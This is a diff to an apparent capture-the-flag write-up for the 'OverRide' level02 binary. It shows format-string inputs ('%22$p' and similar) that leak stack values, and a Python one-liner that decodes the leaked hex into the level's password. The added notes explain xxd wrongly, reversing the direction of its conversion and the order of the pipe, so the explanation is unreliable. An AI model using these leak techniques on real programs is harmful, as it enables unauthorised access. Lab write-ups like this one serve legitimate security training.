@@ -171,15 +171,17 @@ level02@OverRide:~$ for ((i=1; i<=26; i++)); do (python -c "print '%$i\$p'" && e
 ```
 
 more simplistic syntax
-```
-(python -c 'print "%22$p %23$p %24$p %25$p %26$p" + "\n" + "AAAA"') | ./level02 | xargs -n 1 echo | tail -n 9 | head -n 5
-```
+
+`(python -c 'print "%22$p %23$p %24$p %25$p %26$p" + "\n" + "AAAA"') | ./level02 | xargs -n 1 echo | tail -n 9 | head -n 5`
+
+`python -c "print '756e505234376848'.decode('hex')[::-1] + '45414a3561733951'.decode('hex')[::-1] + '377a7143574e6758'.decode('hex')[::-1] + '354a35686e475873'.decode('hex')[::-1] + '48336750664b394d'.decode('hex')[::-1]"`
+
 
 ********notes
 
-echo "$i - %$i\$p": This command uses the echo command to print a string that includes the current value of i and a format specifier (%$i\$p) that specifies the position of the argument to be printed by the printf function. The $i syntax refers to the current value of the loop variable i, and the backslash before the $ character is used to escape it so that it is interpreted as a literal character.
+`echo "$i - %$i\$p"`: This command uses the echo command to print a string that includes the current value of i and a format specifier (%$i\$p) that specifies the position of the argument to be printed by the printf function. The $i syntax refers to the current value of the loop variable i, and the backslash before the $ character is used to escape it so that it is interpreted as a literal character.
 
-echo "0x756e505234376848" | xxd -r -p
+`echo "0x756e505234376848" | xxd -r -p`
 This will pipe the string "0x756e505234376848" to the xxd command, which will convert it from hex to binary format. The -r option tells xxd to reverse the conversion process (from binary back to hex), and the -p option tells xxd to read the input as plain hexadecimal digits (without any whitespace or other formatting). The resulting binary data is then piped to the echo command, which will print it to the console as ASCII text.
 
 
